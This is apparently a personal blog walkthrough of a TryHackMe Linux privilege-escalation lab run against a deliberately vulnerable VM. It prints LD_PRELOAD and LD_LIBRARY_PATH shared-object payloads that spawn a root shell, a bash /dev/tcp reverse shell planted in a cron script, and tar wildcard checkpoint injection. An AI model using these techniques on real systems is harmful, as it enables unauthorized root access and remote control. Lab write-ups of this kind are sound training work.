---
title: "Linux PrivEsc - TryHackMe"
author: krishna
description: "Walkthrough of Linux PrivEsc from TryHackMe"
date: 2020-10-21 00:00:00 +0530
categories: [writeups, tryhackme]
tags: [privesc, linux]
---

**[Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)**

## Task 1 - Deploy the Vulnerable Debian VM

1. Deploy the machine and login to the "user" account using SSH.

	yea, `ssh user@MACHINE_IP`, then password = `password321`

2. Run the "id" command. What is the result?

	`uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)`

	![ssh in](/assets/img/tryhackme/linuxprivesc/linuxprivesc1.png)

## Task 2 - Service Exploits

nice, good **mysql** exploit

## Task 3 - Weak File Permissions - Readable /etc/shadow

1. What is the root user's password hash?

	![root password hash](/assets/img/tryhackme/linuxprivesc/linuxprivesc2.png)

2. What hashing algorithm was used to produce the root user's password hash?

	`SHA512Crypt`

3. What is the root user's password?

	![hashid and decrypt](/assets/img/tryhackme/linuxprivesc/linuxprivesc3.png)

## Task 4 - Weak File Permissions - Writable /etc/shadow

again, similarily we create the hash for our new password and then replace the root user's hash with it

![change root hash](/assets/img/tryhackme/linuxprivesc/linuxprivesc4.png)

## Task 5 - Weak File Permissions - Writable /etc/passwd

earlier, password hashes used to be stored in `/etc/passwd`. now, unix stores the password 'securely' in `/etc/shadow` which is generally accessible only by superusers.

refer to [this](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/) article for info on structure of `/etc/passwd`

this is the reason by the `x` between the 2nd and 3rd colons (:) in `/etc/passwd` which instructs the system to read the hash from `/etc/shadow`. however, this can be bypassed by replacing the `x` with a password hash which is what we are doing here.

![change root hash in passwd](/assets/img/tryhackme/linuxprivesc/linuxprivesc5.png)

## Task 6 - Sudo - Shell Escape Sequences 

running `sudo -l` we get to see the privileges of the current user,

![privs](/assets/img/tryhackme/linuxprivesc/linuxprivesc6.png)

1. How many programs is "user" allowed to run via sudo?

	as visible from the above screenshot, `11` programs can be run by `user` via sudo

2. One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

	**gtfobins** did not have a shell escape sequence for `apache2`

3. Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.

	the hint tells us to look at the options the program has, so `man /usr/sbin/apache2`. so we have to look at options that execute or process files.

	unfortunately, i did not find a solid way to take advantage of this program, but `sudo /usr/sbin/apache2 -f /etc/passwd` returns us the first line of the file with an error message related to bad config file

	```terminal
	user@debian:~$ sudo /usr/sbin/apache2 -f /etc/passwd
	Syntax error on line 1 of /etc/passwd:
	Invalid command 'root:x:0:0:root:/root:/bin/bash', perhaps misspelled or defined by a module not included in the server configuration
	```

## Task 7 - Sudo - Environment Variables

like the walkthrough says,

> LD_PRELOAD loads a shared object before any others when a program is run

this means that we can create a shared object (to spawn a shell) and pass it to this environment variable during the execution of a program (with sudo for root shell) to execute it before the actual program invoked

![preload libs](/assets/img/tryhackme/linuxprivesc/linuxprivesc7.png)

yes, it works even for other libraries, this is due to nature of the source code of the exploits

![change libs](/assets/img/tryhackme/linuxprivesc/linuxprivesc8.png)

to elaborate, the contents of `/home/user/tools/sudo/preload.c` is

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

and the contents of `/home/user/tools/sudo/library_path.c` is

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

basically, these programs run a system call to `/bin/bash` to spawn a shell and since we run it with sudo, we get a root shell

so this is why the process is independent of the library called

## Task 8 - Cron Jobs - File Permissions

so we see that `overwrite.sh` gets executed every minute

oh btw if you have trouble with reading cron job times, visit [crontab guru](https://crontab.guru)

so now, we can exploit this by writing our code in `overwrite.sh` to connect to our local machine, spawn a shell and when it gets executed by the root user, we'll get a shell

in unix systems, opening ports (or sockets? not sure), is done by accessing the protocol and port in `/dev/` like a file (it is called a file descriptor if i'm right)

so, our code would be

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

```

**explanation:**

* 1st line: shebang to denote interpreter, this case - bash

* 2nd line: `bash -i` to open an interactive shell, `>& /dev/tcp/10.10.10.10/4444` to redirect all streams to our local machine and `0>&1` to redirect **stdin** and **stdout** to **stdout**

so, after editing the code in `overwrite.sh`, we listen on our local machine waiting for a shell

![root overwrite](/assets/img/tryhackme/linuxprivesc/linuxprivesc9.png)

## Task 9 - Cron Jobs - PATH Environment Variable

this privesc takes advantage of the priority order of the **PATH** environment variable. the idea is that, in case the original `overwrite.sh` is inaccessible, we can create a file with the same name (consisting of our code) in `/home/user` which appears before other paths in `$PATH`.

## Task 10 - Cron Jobs - Wildcards

the other script being run in the crontab is `compress.sh`. its contents are

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

this code zips all the files and folders present in `/home/user` and stores it in `/tmp/backup.tar.gz`. taking help from [gtfobins](https://gtfobins.github.io/gtfobins/tar/), we understand that the flag `--checkpoint` and `--checkpoint-action` can be exploited to execute files. so, when the wildcard is expanded to all the files in the directory, it'll look like `tar czf /tmp/backup.tar.gz file1 file2 --checkpoint=1 --checkpoint-action=exec=shell.elf`

![tar rev shell](/assets/img/tryhackme/linuxprivesc/linuxprivesc10.png)

## Task 11 - SUID / SGID Executables - Known Exploits

pretty straight-forward

![exim vuln](/assets/img/tryhackme/linuxprivesc/linuxprivesc11.png)

## Task 12 - SUID / SGID Executables - Shared Object Injection

when we run `/usr/local/bin/suid-so` (something to do with shared objects), it shows a progress bar and then exits

so we run a `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"` to see if there are misconfigurations or files that we can change to exploit this executable.

from the output, our target is `/home/user/.config/libcalc.so` because it doesn't exist and we have read-write permissions to manage files and folders

on compiling and running the exploit, we get root shell access

![misconfig libcalc](/assets/img/tryhackme/linuxprivesc/linuxprivesc12.png)

## Task 13 - SUID / SGID Executables - Environment Variables

this privesc also manipulates environment variables and improper definition of executable to gain root shell access

![use the goddamn full name lady](/assets/img/tryhackme/linuxprivesc/linuxprivesc13.png)

## Task 14 - SUID / SGID Executables - Abusing Shell Features (#1)

this was very interesting. so in bash versions less than 4.2-048, we can define functions that resemble file paths

![i paid for the full name, im going to use the full name](/assets/img/tryhackme/linuxprivesc/linuxprivesc14.png)

## Task 15 - SUID / SGID Executables - Abusing Shell Features (#2)

so, in bash versions less than 4.4 and above, we could define the PS4 variable to display an extra prompt for debugging statements in debugging mode.

![not playstation4](/assets/img/tryhackme/linuxprivesc/linuxprivesc15.png)

## Task 16 - Passwords & Keys - History Files

```terminal
user@debian:~$ cat ~/.*history | grep mysql
mysql -h somehost.local -uroot -ppassword123
user@debian:~$
```

it seems that the user had entered their root password in the command itself

## Task 17 - Passwords & Keys - Config Files

the user had stored his root credentials in `/etc/openvpn/auth.txt` to authenticate for vpn connection

![bad sec practice](/assets/img/tryhackme/linuxprivesc/linuxprivesc16.png)

## Task 18 - Passwords & Keys - SSH Keys

oh right, never leave your root key readable to everybody

## Task 19 - NFS

so we can share folders through nfs wherever allowed i guess, so we create a temporary folder - `/tmp/nfs` and mount the `/tmp` folder from the machine and upload our exploit that executes code to spawn a shell.

since files created by nfs take the remote user's id (because root squashing is disabled for `/tmp`), we upload the file using our local machine's root user and execute it in the debian machine online

also, from the config file - `/etc/exports` - visible, we can see that the `no_root_squashing` option disables root squashing

## Task 20 - Kernel Exploits

v informative

## Task 21 - Privilege Escalation Scripts

nice scripts

*v cool, thank you, creator of this room!*
